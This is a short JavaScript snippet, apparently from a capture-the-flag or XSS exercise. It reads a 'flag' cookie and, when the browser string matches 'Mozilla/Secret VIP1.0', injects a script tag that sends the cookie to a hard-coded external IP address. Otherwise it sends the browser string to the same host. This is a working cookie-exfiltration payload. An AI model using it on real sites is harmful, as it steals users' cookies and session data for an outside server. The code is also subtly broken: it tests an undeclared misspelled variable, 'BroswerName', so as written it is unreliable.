//读取cookies 
function getCookie(name) 
{ 
    var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");
    if(arr=document.cookie.match(reg)) {
        return unescape(arr[2]); 
    } else {
        return null; 
    }
} 

console.log("Hello Word");

var browser=navigator.appName
var b_version=navigator.appVersion
// var version=parseFloat(b_version)
var BrowserName=browser+b_version; 

if(BroswerName == 'Mozilla/Secret VIP1.0') {
    var flag=getCookie('flag');
    var script=document.createElement('script');
    script.src='http://119.29.81.170:7892/?flag='+flag;
    document.body.appendChild(script);
} else {
    var script=document.createElement('script');
    script.src='http://119.29.81.170:7892/?broswer='+BrowserName;
    document.body.appendChild(script);
}
